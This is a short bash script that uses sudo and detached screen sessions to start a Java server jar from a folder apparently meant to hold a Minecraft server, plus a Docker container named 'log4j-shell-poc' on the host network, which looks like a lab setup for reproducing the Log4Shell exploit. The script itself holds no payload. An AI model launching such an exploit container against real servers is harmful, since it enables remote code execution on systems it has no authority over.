#!/bin/bash

CWD=$(pwd)
sudo screen -AmdS mserver java -Xmx1024M -Xms1024M -jar "${CWD}/setup/minercfat-server/server.jar" nogui
sudo screen -AmdS dockerpoc docker run --network host log4j-shell-poc
